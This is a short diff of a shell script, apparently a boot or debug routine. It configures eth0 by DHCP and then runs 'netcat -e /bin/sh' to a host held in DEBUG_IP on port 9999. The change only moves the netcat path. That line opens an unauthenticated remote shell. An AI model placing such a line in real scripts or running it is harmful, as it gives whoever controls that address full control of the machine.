@@ -27,7 +27,7 @@ then
         echo "auto eth0" > /etc/network/interfaces
         echo "iface eth0 inet dhcp" >> /etc/network/interfaces
         /sbin/ifup eth0
-        /bin/netcat -e /bin/sh "$DEBUG_IP" 9999
+        /usr/bin/netcat -e /bin/sh "$DEBUG_IP" 9999
 
 	while true
 	do
